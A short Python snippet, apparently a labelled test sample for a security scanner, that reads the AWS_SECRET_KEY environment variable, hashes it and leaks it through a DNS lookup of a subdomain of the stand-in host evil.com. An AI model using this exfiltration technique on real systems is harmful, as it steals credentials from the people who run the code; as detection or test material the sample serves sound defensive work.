# Evasion: DNS exfiltration via constructed subdomain
import socket
import os
import hashlib
secret = os.environ.get('AWS_SECRET_KEY', '')
chunk = hashlib.md5(secret.encode()).hexdigest()
# DNS lookup encodes data in subdomain
socket.getaddrinfo(f'{chunk}.evil.com', 80)
